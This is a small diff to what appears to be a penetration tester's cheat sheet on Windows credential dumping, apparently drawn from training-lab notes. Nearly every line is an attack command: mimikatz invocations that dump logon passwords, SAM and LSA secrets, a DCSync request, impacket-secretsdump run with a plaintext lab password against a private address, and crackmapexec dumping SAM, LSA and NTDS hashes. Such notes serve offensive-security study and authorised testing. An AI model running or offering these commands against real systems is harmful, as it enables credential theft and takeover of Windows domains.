@@ -3,9 +3,10 @@
 ```
 .\mimikatz.exe "privilege::debug" "log mimikatz_passwords.txt" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" "exit"
 
-#Dump hash for user
-lsadump::dcsync /user:<domain>\<user>
+#DC SYNC
 
+lsadump::dcsync /user:<domain>\<user>
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 impacket-secretsdump <user>@<ip>
 
 crackmapexec smb <ip> -u <user> -p <password> --sam / --lsa / --ntds
